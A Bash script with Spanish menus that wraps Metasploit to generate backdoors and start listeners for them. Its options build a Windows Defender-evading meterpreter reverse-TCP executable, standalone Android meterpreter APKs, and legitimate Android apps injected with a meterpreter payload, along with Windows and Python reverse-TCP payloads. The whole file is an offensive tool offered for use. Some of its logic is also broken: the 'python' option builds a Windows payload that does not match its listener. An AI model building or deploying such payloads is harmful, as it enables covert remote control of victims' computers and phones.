#!/bin/bash
#Script created for Facu Salgado: https://github.com/ByteSalgado

# trap function ctrl + c 
trap ctrl_c INT


#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


function ctrl_c() {

echo -e "$purple(*)$blue Presionaste la tecla$red CTRL + C$blue Saliendo del programa.."
sleep 2
echo -e "$purple(*)$blue Gracias por usar mi Script by$red Facu Salgado$nc"
sleep 1
exit

}

#comprobar directorio


directory=$(pwd)


#opciones menus

a="Windows Bypass Defender"
b="Android apk (custom)"
c="Inject Original Apk (android)"
d="Windows Customs payloads"
e="Salir"

s="Si"
n="No"

w="Si Iniciar"
z="No Salir"

p="Windows"
t="Volver al menu principal"

p1="reverse_tcp"
p2="python reverse tcp"




#verificacion de dependencias

if [[ $EUID -ne 0 ]]; then	
echo "														         "
echo "(✗) No eres usuario root, para ejecutar la heramienta tienes que ejecutarla siendo root (✗)      "				  
echo "(✗) You are not a root user, to run the tool you have to run it as root (✗)              "		
exit 1
fi

if which msfconsole >/dev/null; then
sleep 1
echo -e "$blue(Metasploit)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(Metasploit)$nc ................................................... No Instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install metasploit-framework]"
sleep 1
exit 1
fi

if which java >/dev/null; then
sleep 1
echo -e "$blue(Java)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(Java)$nc ................................................... No Instalado [$red✗$nc]"
sleep 3
echo "Instala escribiendo [sudo apt install default-jdk -y"
sleep 1
exit 1
fi

if which apktool >/dev/null; then
sleep 1
echo -e "$blue(apktool)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(apktool)$nc ................................................... No Instalado [$red✗$nc]"
sleep 3
echo "Instala escribiendo [sudo apt install apktool -y"
sleep 1
exit 1
fi



if which toilet >/dev/null; then
sleep 1
echo -e "$blue(Toilet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(Toilet)$nc ................................................... No Instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install toilet]"
sleep 1
exit 1
fi


#mensaje bienvenida y logo

clear
tput setaf 3  && toilet --filter border MsfPayload
sleep 2
echo -e "$purple(*)$blue Script created by$red Facu Salgado"
sleep 2
echo -e "$purple(*)$blue Gracias por utilizar nuestro Script$green"




PS3="Seleciona una Opcion: "


#menu principal

function menu_principal(){
echo
echo
select menu in "$a" "$b" "$c" "$d" "$e";
do
case $menu in
$a)
echo -e "$purple(*)$blue Esta opcion creara un Payload para Windows de conexion$red reversa TCP"
sleep  2
echo -e "$purple(*)$blue Utilizara un Modulo especial de $red MSF5$blue para Bypassear el firewall$red Windows Defender"
sleep 2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
sleep 1
echo -e "$purple(*)$blue Espere un momento por favor"
sleep 2
echo "
msfconsole
use evasion/windows/windows_defender_exe
set payload windows/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
set FILENAME $name.exe
run 
exit " >> bypass_defender.rc
echo -e "$purple(*)$blue Archivo creado$red Aguarde por favor.."
sleep 2
echo -e "$purple(*)$blue Crearemos el backdoor en 5 segundos.."
sleep 1
echo -e "$purple(*)$blue 4 Segundos.."
sleep 1
echo -e "$purple(*)$blue 3 Segundos.."
sleep 1
echo -e "$purple(*)$blue 2 Segundos.."
sleep 1
echo -e "$purple(*)$blue 1 Segundos.."
sleep 1
msfconsole -r bypass_defender.rc
echo -e "$purple(*)$blue el backdoor fue creado correctamente"
rm bypass_defender.rc
mv /root/.msf4/local/$name.exe $directory/payloads/windows_defender_bypass
echo -e "$purple(*)$blue el backdoor se encuentra en el$red PATH:$purple $directory/payloads/windows_defender_bypass/$name.exe"
sleep 2
echo -e "$purple(*)$blue Desea crear un listener automatico para metasploit?"
echo 
echo
#comienzo menu listener
select afirmar in "$s" "$n";
do
case $afirmar in
$s)

echo -e "$blue"
read -p "EScriba el nombre de su listener: " listener
echo "
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
run" >> listeners/$listener.rc
echo -e "$purple(*)$blue Listener creado correctamente$red PATH:$purple listeners/$listener.rc"
sleep 2
echo -e "$purple(*)$blue Desea iniciar la escucha ahora mismo?"
echo
echo
#comienzo menu iniciar listener
select escucha in "$w" "$z";
do
case $escucha in
$w)
echo -e "$purple(*)$blue Iniciando Listener en 3 segundos.."
sleep 3
msfconsole -r listeners/$listener.rc
echo -e "$purple(*)$blue volviendo al menu principal..$green"
sleep 2
menu_principal
;;

$z)
echo -e "$purple(*)$blue Bien no iniciaremos el listener"
sleep 1
echo -e "$purple(*)$blue Recuerde que su listener estara en el patch listeners"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal..$green"
menu_principal
;;

*)

echo -e "$red(Error)$blue Opcion no valida$green"
;;
esac
done
#fin menu iniciar listener


;;
$n)
echo -e "$purple(*)$blue Ha denegado la creacion del Listener, debera introducirlo manualmente"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal$green"
sleep 1
menu_principal
;;

*)
echo -e "$purple(*)$red Error$blue Opcion no valida$green"
;;
esac 
done
#fin menu listener creacion confirmar



;;

$b)
echo -e "$purple(*)$blue Esta opcion creara un backdoor apk custom para android"
sleep 2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
sleep 1
echo -e "$purple(*)$blue Espere un momento por favor"
sleep 2
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/android_custom/$name.apk
echo -e "$purple(*)$blue Backdoor creado correctamente$red PATH:$blue $directory/payloads/android_custom/$name.apk"
sleep 2
echo -e "$purple(*)$blue Desea crear el listener?"
sleep 1
#comienzo confirm listener android creation
select listener_android in "$s" "$n";
do 
case $listener_android in

$s)

echo -e "$blue"
read -p "EScriba el nombre de su listener: " listener
echo "
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
run" >> listeners/$listener.rc
echo -e "$purple(*)$blue Listener creado correctamente$red PATH:$purple listeners/$listener.rc"
sleep 2
echo -e "$purple(*)$blue Desea iniciar la escucha ahora mismo?"
echo
echo
#comienzo menu iniciar listener
select androidiniciatelis in "$w" "$z";
do 
case $androidiniciatelis in

$w)
echo -e "$purple(*)$blue Iniciando Listener en 3 segundos.."
sleep 3
msfconsole -r listeners/$listener.rc
echo -e "$purple(*)$blue volviendo al menu principal..$green"
sleep 2
menu_principal
;;


$z)
echo -e "$purple(*)$blue Bien no iniciaremos el listener"
sleep 1
echo -e "$purple(*)$blue Recuerde que su listener estara en el patch listeners"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal..$green"
menu_principal

;;

*)
echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;

$n)
echo -e "$purple(*)$blue Ha denegado la creacion del Listener, debera introducirlo manualmente"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal$green"
sleep 1
menu_principal
;;
*)

echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done
#fin confirm lisntener android creation
;;

$c)

echo -e "$purple(*)$blue Esta opcion creara un backdoor apk en una aplicacion legitima"
sleep 2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
read -p "EScriba PATH donde esta su app legitima: " app
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
sleep 1
echo -e "$purple(*)$blue Espere un momento por favor"
sleep 2
msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/android_original/$name.apk
echo -e "$purple(*)$blue Backdoor creado correctamente$red PATH:$blue $directory/payloads/android_original/$name.apk"
sleep 2
echo -e "$purple(*)$blue Desea crear el listener?"
sleep 1
#comienzo confirm listener android creation
select listener_android_original in "$s" "$n";
do 
case $listener_android_original in

$s)

echo -e "$blue"
read -p "EScriba el nombre de su listener: " listener
echo "
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
run" >> listeners/$listener.rc
echo -e "$purple(*)$blue Listener creado correctamente$red PATH:$purple listeners/$listener.rc"
sleep 2
echo -e "$purple(*)$blue Desea iniciar la escucha ahora mismo?"
echo
echo
#comienzo menu iniciar listener
select androidiniciateliss in "$w" "$z";
do 
case $androidiniciateliss in

$w)
echo -e "$purple(*)$blue Iniciando Listener en 3 segundos.."
sleep 3
msfconsole -r listeners/$listener.rc
echo -e "$purple(*)$blue volviendo al menu principal..$green"
sleep 2
menu_principal
;;


$z)
echo -e "$purple(*)$blue Bien no iniciaremos el listener"
sleep 1
echo -e "$purple(*)$blue Recuerde que su listener estara en el patch listeners"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal..$green"
menu_principal

;;

*)
echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;

$n)
echo -e "$purple(*)$blue Ha denegado la creacion del Listener, debera introducirlo manualmente"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal$green"
sleep 1
menu_principal
;;
*)

echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done
#fin confirm lisntener android creation
;;

$d)

echo -e "$purple(*)$blue Esta opcion le permite crear multiples backdoors de diferentes lenguajes.."
sleep 2
echo -e "$purple(*)$blue Sin embargo no se garantiza la evasion de AV y es posible que sea detectado.."
sleep 2
echo -e "$purple(*)$blue Para continuar eliga el sistema operativo para el backdoor"
sleep 2
echo
echo
#inicio menu sistema OS
select os in "$p" "$t";
do
case $os in

$p)
echo -e "$purple(*)$blue Bien eligio el sistema Windows"
sleep 2
echo -e "$purple(*)$blue A continuacion escoga el tipo de payload"
sleep 2
echo
echo
#principio payload type
select payloadtype in "$p1" "$p2";
do
case $payloadtype in

$p1)
echo -e "$purple(*)$blue Bien escogio el payload de tipo$red reverse_tcp$blue TARGET OS:$red Windows"
sleep 2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/windows_custom/$name.exe
echo -e "$purple(*)$blue Backdoor creado correctamente$red PATH:$blue $directory/payloads/windows_custom/$name.apk"
sleep 2
echo -e "$purple(*)$blue Desea crear el listener?"
sleep 1
#comienzo confirm listener  menu
select custom_listener in "$s" "$n";
do 
case $custom_listener in

$s)

echo -e "$blue"
read -p "EScriba el nombre de su listener: " listener
echo "
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
run" >> listeners/$listener.rc
echo -e "$purple(*)$blue Listener creado correctamente$red PATH:$purple listeners/$listener.rc"
sleep 2
echo -e "$purple(*)$blue Desea iniciar la escucha ahora mismo?"
echo
echo
#comienzo menu iniciar listener
select confirmlistener1 in "$w" "$z";
do 
case $confirmlistener1 in

$w)
echo -e "$purple(*)$blue Iniciando Listener en 3 segundos.."
sleep 3
msfconsole -r listeners/$listener.rc
echo -e "$purple(*)$blue volviendo al menu principal..$green"
sleep 2
menu_principal
;;


$z)
echo -e "$purple(*)$blue Bien no iniciaremos el listener"
sleep 1
echo -e "$purple(*)$blue Recuerde que su listener estara en el patch listeners"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal..$green"
menu_principal

;;

*)
echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;

$n)
echo -e "$purple(*)$blue Ha denegado la creacion del Listener, debera introducirlo manualmente"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal$green"
sleep 1
menu_principal
;;
*)

echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;


$p2)

echo -e "$purple(*)$blue Bien escogio el payload de tipo$red python reverse tcp$blue TARGET OS:$red Windows"
sleep 2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/python/$name.py
echo -e "$purple(*)$blue Backdoor creado correctamente$red PATH:$blue $directory/payloads/python/$name.py"
sleep 2
echo -e "$purple(*)$blue Desea crear el listener?"
sleep 1
#comienzo confirm listener  menu
select custom_listener in "$s" "$n";
do 
case $custom_listener in

$s)

echo -e "$blue"
read -p "EScriba el nombre de su listener: " listener
echo "
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
run" >> listeners/$listener.rc
echo -e "$purple(*)$blue Listener creado correctamente$red PATH:$purple listeners/$listener.rc"
sleep 2
echo -e "$purple(*)$blue Desea iniciar la escucha ahora mismo?"
echo
echo
#comienzo menu iniciar listener
select confirmlistener1 in "$w" "$z";
do 
case $confirmlistener1 in

$w)
echo -e "$purple(*)$blue Iniciando Listener en 3 segundos.."
sleep 3
msfconsole -r listeners/$listener.rc
echo -e "$purple(*)$blue volviendo al menu principal..$green"
sleep 2
menu_principal
;;


$z)
echo -e "$purple(*)$blue Bien no iniciaremos el listener"
sleep 1
echo -e "$purple(*)$blue Recuerde que su listener estara en el patch listeners"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal..$green"
menu_principal

;;

*)
echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;

$n)
echo -e "$purple(*)$blue Ha denegado la creacion del Listener, debera introducirlo manualmente"
sleep 1
echo -e "$purple(*)$blue Volviendo al menu principal$green"
sleep 1
menu_principal
;;
*)

echo -e "$purple(*)$red(Error)$blue Opcion no valida$green"
;;
esac
done

;;

*)
echo -e "$red(Error)$blue Opcion no valida$green"

;;
esac
done
#fin payload type


;;

$t)

echo -e "$blue Bien volveremos al menu anterior$green"
sleep 2
menu_principal
;;

*)

echo -e "$red(Error)$blue Opcion no valida$green"
;;
esac
done
#fin menu sistema OS


;;

$e)
echo -e "$purple(*)$blue Adios y suerte!!"
sleep 2
echo -e "$purple(*)$blue Gracias por usar mi Script by$red Facu Salgado$nc"
sleep 1
exit

;;

*)

echo -e "$red(Error)$blue Opcion no valida$green"
;;
esac
done

}
#fin menu principal

menu_principal #llamada a la funcion menu
